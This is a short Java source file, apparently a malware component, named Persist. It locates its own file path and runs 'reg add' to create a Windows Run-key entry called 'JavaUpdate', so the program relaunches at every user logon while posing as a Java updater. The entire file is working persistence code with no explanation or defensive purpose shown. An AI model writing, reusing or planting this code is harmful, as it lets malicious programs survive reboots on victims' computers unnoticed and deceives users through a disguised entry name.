import java.io.*;
import java.lang.management.*;
public class Persist{public static void main(String[]a)throws Exception{String p=new File(Persist.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getPath();Runtime.getRuntime().exec(new String[]{"reg","add","HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run","/v","JavaUpdate","/t","REG_SZ","/d",p,"/f"});}}
